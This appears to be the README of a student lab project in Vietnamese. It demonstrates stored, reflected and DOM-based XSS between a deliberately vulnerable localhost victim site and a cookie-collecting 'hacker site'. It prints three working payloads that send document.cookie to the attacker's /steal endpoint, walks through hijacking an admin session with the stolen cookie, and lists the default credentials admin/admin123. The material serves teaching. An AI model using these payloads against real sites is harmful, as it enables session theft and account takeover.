# Demo Do An Bao Mat: Stored XSS (2 Folder, 2 Localhost)

## 1) Mo ta
Project da duoc tach thanh 2 ung dung rieng:
- Victim site: trang admin/user binh thuong, chay o localhost:5000
- Hacker site: trang cua hacker de thu cookie, chay o localhost:5001

## 2) Cau truc thu muc

```text
final/
   victim_site/
      app.py
   config.py
   db.py
   security.py
   .env.example
      requirements.txt
      database.db
      cookies.txt
      templates/
      static/
   hacker_site/
      app.py
      requirements.txt
      hacker_cookies.txt
      templates/
         hacker_dashboard.html
   README.md
```

## 3) Cai dat

Ban co the cai 1 lan tu root hoac trong moi folder:

```bash
pip install -r victim_site/requirements.txt
```

hoac

```bash
cd victim_site
pip install -r requirements.txt
cd ..
cd hacker_site
pip install -r requirements.txt
```

## 3.1) Ket noi CSDL voi Railway (MySQL)

Project victim site da ho tro 2 che do CSDL:
- Co `DATABASE_URL` => dung Railway MySQL
- Khong co `DATABASE_URL` => fallback ve SQLite local

App da tach rieng cac file:
- `config.py`: load env va cac bien cau hinh
- `db.py`: ket noi DB + khoi tao schema
- `security.py`: decorator va input validation

Buoc cau hinh Railway:

1. Vao Railway, tao project moi.
2. Add service MySQL.
3. Mo tab Variables, copy bien `DATABASE_URL`.
4. Trong `victim_site`, tao file `.env` tu mau `.env.example` va dien gia tri:

```env
DATABASE_URL=mysql://user:password@host:port/database
SECRET_KEY=doi-secret-key-rieng-cua-ban
```

5. Chay victim app (app se tu dong doc file `.env`):

```powershell
cd victim_site
python app.py
```

Neu muon secure mode:

```powershell
cd victim_site
python app.py --secure
```

Khi chay thanh cong, terminal se in:
- `[DB] Dang su dung Railway MySQL qua DATABASE_URL`

## 4) Chay 2 localhost bang 2 terminal

### Terminal 1: Victim (admin/user)

```bash
cd victim_site
python app.py
```

Mo: http://127.0.0.1:5000

### Terminal 2: Hacker

```bash
cd hacker_site
python app.py
```

Mo: http://127.0.0.1:5001

### Chay victim o secure mode

```bash
cd victim_site
python app.py --secure
```

## 5) Tai khoan mau

- Admin
   - username: admin
   - password: admin123
- User: tu dang ky

## 6) Payload XSS de demo

Demo Stored

```html
<script>
new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
</script>
```
Demo Reflected
http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E

Demo DOM
http://127.0.0.1:5000/profile#%3Cimg%20src=x%20onerror=%22fetch('http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie))%22%3E

## 7) Quy trinh demo

*Lưu ý: Trang hacker: hacker-site(localhost:5001), trang demo: victim-site(localhost:5000)
http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie): Đây là API lấy cookie của phía server hacker(hacker-site/app.py)

*Stored XSS( Hoàng Thanh)
Link: Demo Stored

```html
<script>
new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
</script>
```

1. Mở trang hacker site trên localhost:5001.
2. Mở trang demo (localhost:5000)
3. Đăng ký và đăng nhập tren victim site(5000) ( đoạn này là hacker đăng ký giả mạo tài khoản người dùng)
4. Ở trang demo khác(ẩn danh), đăng nhập với tài khoản admin (admin, admin123), show trang trang liên hệ xem cmt của user(ban đầu là 1 cmt dịch vụ tốt)
5. Quay lại trang demo với role user, nhấn vào phần liên hệ
6. Chen payload stored XSS vao comment và gửi (payload sẽ lưu vào trong database)
7. Ở trang demo role admin, nhấn vào xem comment(lúc này sẽ thực thi câu lệnh script ở trong data payload)
8. Đoạn script sẽ thực thi lấy cookies và gửi sang phía server của hacker(trang hacker) và lưu cookies vào file
9. Vào file hacker_cookies.txt kiểm tra(dòng đầu là cookies của role user hacker giả danh, dòng cuối là cookie của admin)
10. Hacker sử dụng cookies đó để đăng nhập phiên admin mà không cần tài khoản mật khẩu
11. Từ đấy hacker có thể truy cập vào trang admin và đánh cắp cũng như kiểm soát được trang demo đó


*Reflected XSS(Nhật quang)

Link Demo Reflected
http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E


1. Mở trang hacker site trên localhost:5001.
2. Mở trang demo (localhost:5000)
3. Đăng ký và đăng nhập tren victim site(5000) ( đoạn này là hacker đăng ký giả mạo tài khoản người dùng)
4. Ở trang demo khác(ẩn danh), đăng nhập với tài khoản admin (admin, admin123), show trang trang tin nhắn xem tin nhắn của user(ban đầu chưa có tin nhắn gì)
5. Quay lại trang demo với role user, nhấn vào phần message
6. Chen payload(link) reflected XSS vao ô tin nhắn và gửi (link này là 1 url tìm kiếm của trang demo với localhost:5000/?search=...)
7. Ở trang demo role admin, nhấn vào xem tin nhắn(sẽ thấy user gửi link)
8. Admin nhấn vào link, lúc này link sẽ mở ra url có dạng localhost:5000/?search=... và ở sau phần search là một đoạn script sẽ được thực thi lệnh lấy cookie và gửi về phía server hacker
9. Vào file hacker_cookies.txt kiểm tra(dòng có thời gian lúc bấm vào link cookie admin)
10. Hacker sử dụng cookies đó để đăng nhập phiên admin mà không cần tài khoản mật khẩu
11. Từ đấy hacker có thể truy cập vào trang admin và đánh cắp cũng như kiểm soát được trang demo đó


Long Thiên
1. Mở trang hacker site trên localhost:5001.
2. Mở trang demo (localhost:5000)
3. Đăng ký và đăng nhập tren victim site(5000) ( đoạn này là hacker đăng ký giả mạo tài khoản người dùng)
4. Ở trang demo khác(ẩn danh), đăng nhập với tài khoản admin (admin, admin123), show trang trang tin nhắn xem tin nhắn của user(ban đầu chưa có tin nhắn gì)
5. Quay lại trang demo với role user, nhấn vào phần message
6. Chen payload(link) DOM-based XSS vao ô tin nhắn và gửi (link này là 1 url tìm kiếm của trang demo với localhost:5000/profile)
7. Ở trang demo role admin, nhấn vào xem tin nhắn(sẽ thấy user gửi link)
8. Admin nhấn vào link, lúc này link sẽ mở ra url có dạng localhost:5000/profile#... và ở sau phần # là một thẻ <img> nhưng bị lỗi nên nó sẽ thực thi đoạn sau oneror đó chính là script sẽ được thực thi lệnh lấy cookie và gửi về phía server hacker
9. Vào file hacker_cookies.txt kiểm tra(dòng có thời gian lúc bấm vào link cookie admin)
10. Hacker sử dụng cookies đó để đăng nhập phiên admin mà không cần tài khoản mật khẩu
11. Từ đấy hacker có thể truy cập vào trang admin và đánh cắp cũng như kiểm soát được trang demo đó

## 8) Route chinh

Victim site:
- GET /
- GET, POST /register
- GET, POST /login
- GET /logout
- GET, POST /user
- GET /admin
- POST /admin/delete/<id>
- GET /about-security
- GET /log?cookie=... (route doi chieu)

Hacker site:
- GET /
- GET /steal?cookie=...
- POST /clear

## 9) Luu y

- Chi dung de hoc tap trong moi truong lab noi bo.
- Khong trien khai ra internet.
